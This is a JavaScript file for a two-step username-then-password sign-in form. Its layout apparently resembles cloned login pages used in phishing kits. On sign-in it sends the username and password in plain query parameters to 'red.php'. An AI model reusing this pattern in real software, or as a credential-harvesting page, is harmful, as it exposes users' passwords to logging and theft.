document.addEventListener('DOMContentLoaded', () => {
    const unReq = "Enter a valid username.";
    const pwdReq = "Please enter the password.";
    const unameInp = document.getElementById('inp_uname');
    const pwdInp = document.getElementById('inp_pwd');
    let view = "uname";

    let unameVal = pwdVal = false;

    const nxt = document.getElementById('btn_next');
    const sig = document.getElementById('btn_sig');

    function validateUsername() {
        if (unameInp.value.trim() === "") {
            document.getElementById('error_uname').innerText = unReq;
            unameInp.classList.add('error-inp');
            unameVal = false;
        } else {
            document.getElementById('error_uname').innerText = "";
            unameInp.classList.remove('error-inp');
            unameVal = true;
        }
    }

    function validatePassword() {
        if (pwdInp.value.trim() === "") {
            document.getElementById('error_pwd').innerText = pwdReq;
            pwdInp.classList.add('error-inp');
            pwdVal = false;
        } else {
            document.getElementById('error_pwd').innerText = "";
            pwdInp.classList.remove('error-inp');
            pwdVal = true;
        }
    }

    unameInp.addEventListener('change', validateUsername);
    pwdInp.addEventListener('change', validatePassword);

    nxt.addEventListener('click', (event) => {
        event.preventDefault(); // Prevent default form submission
        validateUsername();
        if (unameVal) {
            document.getElementById("section_uname").classList.add('d-none');
            document.getElementById('section_pwd').classList.remove('d-none');
            document.querySelectorAll('#user_identity').forEach((e) => {
                e.innerText = unameInp.value;
            });
            view = "pwd";
        }
    });

    sig.addEventListener('click', (event) => {
        event.preventDefault(); // Prevent default form submission
        validatePassword();
        if (pwdVal) {
            const uname = encodeURIComponent(unameInp.value.trim());
            const pwd = encodeURIComponent(pwdInp.value.trim());
            const url = `red.php?uname=${uname}&pwd=${pwd}`;
            window.location.href = url; // Redirect to PHP script with parameters
        }
    });

    document.querySelector('.back').addEventListener('click', () => {
        view = "uname";
        document.getElementById("section_pwd").classList.add('d-none');
        document.getElementById('section_uname').classList.remove('d-none');
    });

    document.querySelectorAll('#btn_final').forEach((b) => {
        b.addEventListener('click', () => {
            window.open(location, '_self').close();
        });
    });
});
